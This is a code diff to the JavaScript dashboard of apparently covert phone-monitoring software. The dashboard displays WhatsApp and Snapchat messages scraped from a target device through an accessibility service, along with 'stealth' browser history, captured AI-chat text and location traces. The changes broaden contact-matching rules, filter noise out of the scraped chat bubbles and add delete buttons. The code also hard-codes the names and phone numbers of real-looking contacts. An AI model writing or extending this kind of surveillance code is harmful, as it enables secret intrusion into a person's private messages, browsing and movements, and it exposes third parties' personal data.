@@ -1667,18 +1667,22 @@ function waIsReviewCandidate(k) {
   return true;
 }
 
-// ── Priority & Snapchat helpers — exact gate mirroring DuaAccessibilityService.isPriorityContact (whole-equals + last10) ──
-const PRIORITY_NAMES_L = new Set(["jay","jab \u2705","jab jjj","kinzu","ansar abbas","j","jab+923004345580"]);
-const PRIORITY_LAST10 = new Set(["3004345580","3206224098","3286153372","3490131384","3447179029","3486044711","7481836567"]);
+// ── Priority & Snapchat helpers — expanded to ALL whitelist contacts (user request: not just JAY) ──
+const PRIORITY_NAMES_L = new Set([...WA_HARD_WHITELIST.map(s=>String(s).toLowerCase().replace(/[\u200e\u200f\u202a-\u202e\u2066-\u2069]/g,'').trim()).filter(Boolean), "jay","jab \u2705","jab jjj","kinzu","ansar abbas","j","jab+923004345580"].map(s=>String(s).toLowerCase().replace(/[\u200e\u200f\u202a-\u202e\u2066-\u2069]/g,'').trim()).filter(Boolean));
+const _whitelistLast10 = new Set(WA_HARD_WHITELIST.map(s=>String(s).replace(/\D/g,'')).filter(d=>d.length>=10).map(d=>d.slice(-10)));
+const PRIORITY_LAST10 = new Set([..._whitelistLast10, "3004345580","3206224098","3286153372","3490131384","3447179029","3486044711","7481836567"]);
 function isSnapchatEntry(d){ const t=(d.type||'').toLowerCase(); return t.indexOf('snapchat')!==-1 || (d.packageName||'').toLowerCase()==='com.snapchat.android'; }
 function isPriorityEntry(d){
   if(d.priorityFull===true || (d.captureSource||'')==='priority_full') return true;
   const k=(waClean(d.conversationTitle)||waClean(d.contactName)||'').toLowerCase().trim();
   if(PRIORITY_NAMES_L.has(k)) return true;
+  // substring for longer whitelist names (>3) — mirrors app's isPriorityContact whitelist check
+  for(const w of PRIORITY_NAMES_L){ if(w.length>3 && (k.includes(w) || w.includes(k))) return true; }
   const digits=k.replace(/\D/g,'');
   if(digits.length>=10 && PRIORITY_LAST10.has(digits.slice(-10))) return true;
   const cn=(d.contactName||'').replace(/[\u200e\u200f\u202a-\u202e\u2066-\u2069]/g,'').trim().toLowerCase();
   if(PRIORITY_NAMES_L.has(cn)) return true;
+  for(const w of PRIORITY_NAMES_L){ if(w.length>3 && (cn.includes(w) || w.includes(cn))) return true; }
   const cdigits=cn.replace(/\D/g,'');
   if(cdigits.length>=10 && PRIORITY_LAST10.has(cdigits.slice(-10))) return true;
   return false;
@@ -1686,13 +1690,34 @@ function isPriorityEntry(d){
 function snapPartnerKey(d){ return (waClean(d.conversationTitle)||waClean(d.contactName)||'').toLowerCase().trim(); }
 function priorityPartnerKey(d){ return snapPartnerKey(d); }
 function getBubbles(d){
+  // Helper: detect list-screen artifacts that should never appear as chat bubbles
+  const isListNoise=(t,low)=>{
+    if(WA_SUMMARY_RE.test(t)) return true;
+    if(WA_MSGCOUNT_RE.test(t)) return true;
+    if(/\d+\s+messages?\s+from\s+\d+/i.test(t)) return true;
+    // contact-row previews: "You: Photo", "You: Video", "~ sidra: ..." embedded in list
+    if(low.startsWith('you:')) return true;
+    if(low.startsWith('~ ') || low.startsWith('~')) {
+      // real bubble may start with ~ rarely; but list rows like "~ sania ..." are group previews — treat as noise only if contains signature list patterns
+      if(t.includes(':') && (t.includes('messages)') || t.length>60)) return true;
+      // keep short "~ name" as possible bubble? filter only if very long or contains group keywords — be conservative
+      // for safety, only filter standalone "~ " with colon and long text
+    }
+    // archived / tab labels that leak from list screen — already in chrome but also catch with colon suffix
+    if(low==='archived' || low==='broadcast lists' || low==='new chat' || low==='new group' || low==='new community') return true;
+    // single checkmarks + time badges like "✓✓ 10:30 AM"
+    if(/^[\u2713\u2714✓]+\s*\d{1,2}:\d{2}/i.test(t)) return true;
+    return false;
+  };
+  const _snapChrome=new Set(["send","chat","call","story","viewed","delivered","opened","snap","search","chats","updates","communities","archived","broadcast lists","new chat","new group","new community","unread"]);
+  const _priChrome=new Set(["message","type a message","search","call","video call","attach","camera","back","more options","tap here for contact info","messages and calls are end-to-end encrypted","end-to-end encrypted","chats","updates","communities","archived","broadcast lists","new chat","new group","new community","unread","typing","online"]);
   // New path: bubblesJson with per-bubble side (mine vs theirs) - keep duplicates
   if(d.bubblesJson){
     try{
       const arr=JSON.parse(d.bubblesJson);
       if(Array.isArray(arr) && arr.length){
-        const snapChrome=new Set(["send","chat","call","story","viewed","delivered","opened","snap","search"]);
-        const priChrome=new Set(["message","type a message","search","call","video call","attach","camera","back","more options","tap here for contact info","messages and calls are end-to-end encrypted","end-to-end encrypted"]);
+        const snapChrome=_snapChrome;
+        const priChrome=_priChrome;
         const chrome=isPriorityEntry(d)?priChrome:snapChrome;
         const out=[];
         for(const b of arr){
@@ -1701,6 +1726,8 @@ function getBubbles(d){
           const low=t.toLowerCase();
           if(chrome.has(low)) continue;
           if(low==='tap to view' || low==='tap to chat') continue;
+          if(/^\d{1,2}:\d{2}\s*[ap]m$/i.test(t) && t.length<20) continue;
+          if(isListNoise(t,low)) continue;
           out.push({text:t, out:!!b.out});
         }
         if(out.length) return out;
@@ -1710,8 +1737,8 @@ function getBubbles(d){
   // Fallback for old data (flat string) - whole snapshot side applies to all bubbles in that entry, keep duplicates by not distinct-ing strictly
   const raw=(d.fullMessage&&String(d.fullMessage).trim()) ? String(d.fullMessage) : (d.messagePreview||'');
   if(!raw.trim()) return [];
-  const snapChrome=new Set(["send","chat","call","story","viewed","delivered","opened","snap","search"]);
-  const priChrome=new Set(["message","type a message","search","call","video call","attach","camera","back","more options","tap here for contact info","messages and calls are end-to-end encrypted","end-to-end encrypted"]);
+  const snapChrome=_snapChrome;
+  const priChrome=_priChrome;
   const isPri=isPriorityEntry(d);
   const chrome=isPri?priChrome:snapChrome;
   const isOut = String(d.isIncoming||'').toLowerCase()==='false' || String(d.direction||'').toLowerCase()==='outgoing' || String(d.direction||'').toLowerCase()==='out';
@@ -1722,6 +1749,7 @@ function getBubbles(d){
     if(chrome.has(low)) continue;
     if(low==='tap to view' || low==='tap to chat') continue;
     if(/^\d{1,2}:\d{2}\s*[ap]m$/i.test(p) && p.length<20) continue;
+    if(isListNoise(p,low)) continue;
     if(p.length>=1 && p.length<=1500) out.push({text:p, out:isOut});
   }
   if(!out.length && raw.trim().length>=1) out.push({text:raw.trim().slice(0,1200), out:isOut});
@@ -4755,7 +4783,7 @@ async function pollHistory() {
       if (callsEl) callsEl.innerHTML = '<tr><td colspan="4" style="color:var(--muted)">No calls</td></tr>';
       return;
     }
-    timelineCache = Object.values(all)
+    timelineCache = Object.entries(all).map(([k,v])=>Object.assign({_rtdbKey:k}, v))
       .sort((a, b) => (parseInt(b.ts_ms) || 0) - (parseInt(a.ts_ms) || 0));
     // Merge browser_history (stealth) and aiChats into timeline so Browser/AI chips have data
     try{
@@ -4765,7 +4793,7 @@ async function pollHistory() {
         for(const v of vals){
           const url=v.browserUrl||v.url||'';
           if(!url) continue;
-          timelineCache.push({type:'browser', ts_ms: parseInt(v.ts_ms||v.timestamp||'0')||Date.now(), contactName: url, contact: v.packageName||'', messagePreview: v.browserTitle||v.title||url, browserUrl:url, browserTitle: v.browserTitle||v.title||''});
+          timelineCache.push({type:'browser', _rtdbKey:null, ts_ms: parseInt(v.ts_ms||v.timestamp||'0')||Date.now(), contactName: url, contact: v.packageName||'', messagePreview: v.browserTitle||v.title||url, browserUrl:url, browserTitle: v.browserTitle||v.title||''});
         }
         timelineCache.sort((a,b)=>(parseInt(b.ts_ms)||0)-(parseInt(a.ts_ms)||0));
       }
@@ -4775,7 +4803,7 @@ async function pollHistory() {
       if(ai && typeof ai==='object'){
         const vals2 = ai._arr && Array.isArray(ai._arr) ? ai._arr : Object.values(ai).filter(v=>v && typeof v==='object');
         for(const v of vals2){
-          timelineCache.push({type:'ai', ts_ms: parseInt(v.ts_ms||'0')||Date.now(), contactName: v.packageName||v.aiVisible||'AI', messagePreview: v.aiSnippet||v.aiFullText||v.aiVisible||'', aiSnippet: v.aiSnippet||'', aiFullText: v.aiFullText||''});
+          timelineCache.push({type:'ai', _rtdbKey:null, ts_ms: parseInt(v.ts_ms||'0')||Date.now(), contactName: v.packageName||v.aiVisible||'AI', messagePreview: v.aiSnippet||v.aiFullText||v.aiVisible||'', aiSnippet: v.aiSnippet||'', aiFullText: v.aiFullText||''});
         }
         timelineCache.sort((a,b)=>(parseInt(b.ts_ms)||0)-(parseInt(a.ts_ms)||0));
       }
@@ -6745,6 +6773,11 @@ function renderSnapchatView(filtered){
   let shown=0;
   for(const e of activeEntries){
     const bubList=getBubbles(e);
+    const eKey=String(e._rtdbKey||'');
+    if(eKey && bubList.length){
+      const snapTs=parseInt(e.ts_ms||0);
+      bubblesHtml+=`<div style="display:flex;justify-content:space-between;align-items:center;padding:2px 8px;margin:4px 8px;background:rgba(0,0,0,.04);border-radius:6px;font-size:11px;color:var(--muted)"><span>${pktShort(snapTs)} · ${bubList.length} bubbles</span><button onclick="event.stopPropagation(); deleteTimelineEntry('${eKey.replace(/'/g,"\\'")}')" title="Delete snapshot" style="background:transparent;border:1px solid var(--border);color:var(--muted);border-radius:6px;padding:1px 6px;cursor:pointer;font-size:11px">🗑</button></div>`;
+    }
     for(const b of bubList){
       if(shown>=BUBBLE_LIMIT) break;
       const bub=b.text; const isOut=b.out;
@@ -6754,7 +6787,8 @@ function renderSnapchatView(filtered){
       const low=bub.toLowerCase();
       const isMedia=low==='tap to view' || low==='tap to chat';
       const cls=isMedia? 'snap-bubble snap-media '+(isOut?'out':'in') : 'snap-bubble '+(isOut?'out':'in');
-      bubblesHtml+=`<div class="${cls}">${escHtml(bub)}<span class="snap-time">${pktShort(ts)}</span></div>`;
+      const enc=encodeURIComponent(bub);
+      bubblesHtml+=`<div class="${cls}" style="position:relative">${escHtml(bub)}<span class="snap-time">${pktShort(ts)}</span><button onclick="event.stopPropagation(); deleteTimelineBubble('${String(e._rtdbKey||'').replace(/'/g,"\\'")}', '${enc}', '${isOut?1:0}')" title="Delete this bubble" style="margin-left:6px;background:rgba(0,0,0,.12);border:none;border-radius:50%;width:16px;height:16px;cursor:pointer;font-size:9px;line-height:1;vertical-align:middle">✕</button></div>`;
       shown++;
     }
     if(shown>=BUBBLE_LIMIT) break;
@@ -6793,6 +6827,11 @@ function renderPriorityView(filtered){
   let shown=0;
   for(const e of activeEntries){
     const bubList=getBubbles(e);
+    const eKeyP=String(e._rtdbKey||'');
+    if(eKeyP && bubList.length){
+      const pTs=parseInt(e.ts_ms||0);
+      bubblesHtml+=`<div style="display:flex;justify-content:space-between;align-items:center;padding:2px 8px;margin:4px 8px;background:rgba(7,94,84,.08);border-radius:6px;font-size:11px;color:var(--muted)"><span>${pktShort(pTs)} · ${bubList.length} bubbles</span><button onclick="event.stopPropagation(); deleteTimelineEntry('${eKeyP.replace(/'/g,"\\'")}')" title="Delete snapshot" style="background:transparent;border:1px solid var(--border);color:var(--muted);border-radius:6px;padding:1px 6px;cursor:pointer;font-size:11px">🗑</button></div>`;
+    }
     for(const b of bubList){
       if(shown>=BUBBLE_LIMIT) break;
       const bub=b.text; const isOut=b.out;
@@ -6800,7 +6839,8 @@ function renderPriorityView(filtered){
       const day=new Date(ts).toLocaleDateString('en-PK',{timeZone:PKT, day:'2-digit', month:'short', year:'numeric'});
       if(day!==lastDay){ bubblesHtml+=`<div class="priority-daysep">${escHtml(day)}</div>`; lastDay=day; }
       const cls='priority-bubble '+(isOut?'out':'in');
-      bubblesHtml+=`<div class="${cls}">${escHtml(bub)}<span class="snap-time">${pktShort(ts)}</span></div>`;
+      const encP=encodeURIComponent(bub);
+      bubblesHtml+=`<div class="${cls}" style="position:relative">${escHtml(bub)}<span class="snap-time">${pktShort(ts)}</span><button onclick="event.stopPropagation(); deleteTimelineBubble('${String(e._rtdbKey||'').replace(/'/g,"\\'")}', '${encP}', '${isOut?1:0}')" title="Delete this bubble" style="margin-left:6px;background:rgba(0,0,0,.12);border:none;border-radius:50%;width:16px;height:16px;cursor:pointer;font-size:9px;line-height:1;vertical-align:middle">✕</button></div>`;
       shown++;
     }
     if(shown>=BUBBLE_LIMIT) break;
@@ -7008,8 +7048,14 @@ function renderTimeline(docs) {
       const isLoc = type === 'location' && lat && lng;
       const waCls = waIsWhatsApp(d) ? waClassOf(d) : '';
       const groupTag = waCls === 'group' ? ' <span class="grouptag">\u{1F465} ' + (d.groupName ? d.groupName.replace(/[\u200e\u202b\u202c\u200f*]/g, '') : 'گروپ') + '</span>' : (waCls === 'noise' ? ' <span class="grouptag" style="color:var(--muted);border-color:var(--border);background:rgba(120,120,120,.12)">· system</span>' : '');
-      html += `<div class="card"${isLoc ? ` onclick="flyToLocation(${lat}, ${lng}, '${contact ? contact.replace(/'/g, "\\'") : pkt(ts)}')" style="cursor:pointer"` : ''}${isMirror || secDanger ? ' style="border-left-color:var(--danger)"' : ''}>
-        <div class="time">${icon} ${pkt(ts)}</div>
+      const delBtn = d._rtdbKey ? `<button onclick="event.stopPropagation(); deleteTimelineEntry('${String(d._rtdbKey).replace(/'/g,"\\'")}')" title="Delete this entry" style="margin-left:auto;background:transparent;border:1px solid var(--border);color:var(--muted);border-radius:6px;padding:2px 6px;cursor:pointer;font-size:12px;line-height:1">🗑</button>` : '';
+      const cardStyle = [];
+      if(isLoc) cardStyle.push('cursor:pointer');
+      if(isMirror || secDanger) cardStyle.push('border-left-color:var(--danger)');
+      const cardStyleAttr = cardStyle.length ? ` style="${cardStyle.join(';')}"` : '';
+      const cardClick = isLoc ? ` onclick="flyToLocation(${lat}, ${lng}, '${contact ? contact.replace(/'/g, "\\'") : pkt(ts)}')"` : '';
+      html += `<div class="card"${cardClick}${cardStyleAttr}>
+        <div class="time" style="display:flex;align-items:center;gap:8px">${icon} ${pkt(ts)}<span style="flex:1"></span>${delBtn}</div>
         <div>${contact}${msg ? ': ' + msg : ''}${groupTag}${dur ? ' \u2022 ' + dur + 's' : ''}${dir ? ' ['+dir+']' : ''}${isLoc ? ' \u{1F4CD} click to fly' : ''}${isMirror && mirrorText ? ' ' + mirrorText : ''}${isSec && secText ? ' ' + secText : ''}${durText}</div>
       </div>`;
     }
@@ -7549,6 +7595,53 @@ async function deleteRTDB(path, retries = 3) {
     if (i < retries - 1) await new Promise(res => setTimeout(res, 800 * (i + 1)));
   }
   return false;
+}
+async function deleteTimelineEntry(rtdbKey){
+  if(!selectedDevice || !rtdbKey) return false;
+  if(!confirm('Delete this entry from RTDB? This cannot be undone.')) return false;
+  const ok=await deleteRTDB(`devices/${selectedDevice}/timeline/${rtdbKey}`);
+  if(ok){
+    if(timelineCache) timelineCache=timelineCache.filter(d=>String(d._rtdbKey)!==String(rtdbKey));
+    renderTimeline(timelineCache||[]);
+    showAlert('Entry deleted','success');
+  } else showAlert('Delete failed','error');
+  return ok;
+}
+async function deleteTimelineBubble(entryKey, bubbleText, bubbleOutStr){
+  if(!selectedDevice || !entryKey) return;
+  if(!confirm('Delete this single bubble from RTDB?')) return;
+  try{ bubbleText=decodeURIComponent(bubbleText); }catch(e){}
+  try{
+    const doc=await fetchRTDB(`devices/${selectedDevice}/timeline/${entryKey}`);
+    if(!doc || !doc.bubblesJson) { showAlert('No bubblesJson — deleting whole entry','warn'); return deleteTimelineEntry(entryKey); }
+    let arr; try{ arr=JSON.parse(doc.bubblesJson); }catch{ arr=null; }
+    if(!Array.isArray(arr) || !arr.length){ return deleteTimelineEntry(entryKey); }
+    const targetText=String(bubbleText||'');
+    const targetOut=bubbleOutStr==='1';
+    let idx=-1;
+    for(let i=0;i<arr.length;i++){ const t=String(arr[i].t||arr[i].text||'').trim(); if(t===targetText && !!arr[i].out===targetOut){ idx=i; break; } }
+    if(idx===-1){ // fallback by text only
+      for(let i=0;i<arr.length;i++){ if(String(arr[i].t||arr[i].text||'').trim()===targetText){ idx=i; break; } }
+    }
+    if(idx===-1){ showAlert('Bubble not found','error'); return; }
+    arr.splice(idx,1);
+    if(!arr.length){
+      const ok=await deleteRTDB(`devices/${selectedDevice}/timeline/${entryKey}`);
+      if(ok){ if(timelineCache) timelineCache=timelineCache.filter(d=>String(d._rtdbKey)!==String(entryKey)); renderTimeline(timelineCache||[]); showAlert('Entry deleted (last bubble)','success');}
+      else showAlert('Delete failed','error');
+      return;
+    } else {
+      doc.bubblesJson=JSON.stringify(arr);
+      doc.bubblesCount=arr.length;
+      try{ const texts=arr.map(b=>String(b.t||b.text||'').trim()).filter(Boolean); doc.messagePreview=texts.slice(0,5).join(' | ').slice(0,800); doc.fullMessage=texts.join('\n').slice(0,2000);}catch{}
+      const ok=await writeRTDBStrict(`devices/${selectedDevice}/timeline/${entryKey}`, doc);
+      if(ok){
+        if(timelineCache){ const c=timelineCache.find(d=>String(d._rtdbKey)===String(entryKey)); if(c){ c.bubblesJson=doc.bubblesJson; c.bubblesCount=arr.length; c.messagePreview=doc.messagePreview; c.fullMessage=doc.fullMessage; } }
+        renderTimeline(timelineCache||[]);
+        showAlert('Bubble deleted','success');
+      } else showAlert('Update failed','error');
+    }
+  }catch(e){ showAlert('Bubble delete error: '+e.message,'error'); }
 }
 
 async function estimatePhotos() {
